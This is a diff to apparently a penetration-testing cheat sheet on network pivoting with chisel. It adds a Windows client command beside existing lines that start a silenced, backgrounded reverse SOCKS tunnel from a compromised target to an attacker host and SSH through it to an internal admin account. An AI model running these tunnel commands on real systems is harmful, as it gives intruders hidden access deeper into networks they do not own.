@@ -8,5 +8,8 @@ chisel server --port 8080 --reverse
 # Target:
 /tmp/chisel client 10.0.0.9:8080 R:socks > /dev/null 2>&1 &
 
+# Target Win:
+.\chisel.exe client 10.0.0.9:8080 R:80:10.0.0.1:80
+
 # Kali:
 ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' admin@192.168.0.1
